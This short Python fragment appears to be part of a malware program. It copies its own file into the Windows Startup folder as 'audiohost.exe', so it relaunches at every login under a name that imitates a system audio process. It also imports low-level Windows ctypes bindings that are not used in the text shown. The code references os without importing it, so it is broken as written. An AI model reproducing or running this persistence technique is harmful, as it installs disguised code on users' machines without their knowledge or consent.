# type: ignore

from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref
import shutil

current_path = os.path.realpath(__file__)
appdata_path = os.environ.get('APPDATA')

startup_path = os.path.join(appdata_path, "Microsoft\\Windows\\Start Menu\\Programs\\Startup", "audiohost.exe")

shutil.copyfile(current_path, startup_path)